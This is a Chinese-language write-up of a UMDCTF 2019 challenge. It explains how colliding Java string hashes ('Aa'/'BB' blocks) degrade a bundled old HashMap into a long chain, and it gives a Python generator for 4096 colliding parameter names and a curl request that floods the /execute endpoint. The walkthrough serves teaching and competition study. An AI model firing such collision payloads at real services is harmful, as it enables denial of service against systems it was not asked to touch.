# UMDCTF 2019 - Java Web Execution Service

## 题目简述

附件 JAR 内直接包含 `JWeb.java` 和自定义 `HashMap.java`。`/execute` 会把查询参数名依次插入这份旧式 HashMap；若处理时间超过 10 秒，就读取 `flag.txt`。目标是构造大量哈希碰撞，让单个桶退化为长链。

## 解题过程

`JWeb.storeP` 的关键限制和成功条件是：

```java
if (query.length() > 200000) {
    return "Query Rejected";
}

HashMap<String, Integer> parameters = new HashMap<>();
long start = System.currentTimeMillis();
for (String parameter : query.split("&")) {
    String p = parameter.split("=")[0];
    if (!parameters.containsKey(p)) {
        parameters.put(p, 0);
    }
    if (System.currentTimeMillis() - start > 10000) {
        return readFlag();
    }
}
```

JAR 携带的是链表桶实现，没有 Java 8 标准 HashMap 后来的红黑树化缓解。Java 字符串 `Aa` 与 `BB` 的 `hashCode()` 相同；把每一段独立替换为 `Aa` 或 `BB`，任意等长组合仍然碰撞。取 12 段可得到 $2^{12}=4096$ 个互不相同、每个长度 24 的参数名：

```python
from urllib.parse import quote

keys = [""]
for _ in range(12):
    keys = [prefix + suffix
            for prefix in keys
            for suffix in ("Aa", "BB")]

query = "&".join(f"{quote(key)}=0" for key in keys)
assert len(query) < 200000
open("query.txt", "w").write(query)
```

发送请求：

```bash
curl --get --data-binary @query.txt http://target:8000/execute
```

所有 key 落入同一桶，`containsKey` 和 `put` 反复线性遍历已有链表，总成本趋近 $O(n^2)$，从而跨过 10 秒阈值并进入读取 `flag.txt` 的分支。

仓库没有服务端 `flag.txt`，历史服务也已下线，因此具体 flag 无法从现有材料恢复；源码足以完整确认触发机制。

## 方法总结

这是典型的算法复杂度拒绝服务被转化为条件触发。构造时要同时满足“参数名互异”“哈希值相同”和“总查询长度小于 200000”。判断 Java HashMap 是否会退化必须以题目实际打包的实现为准，不能套用当前 JDK 的树化行为。
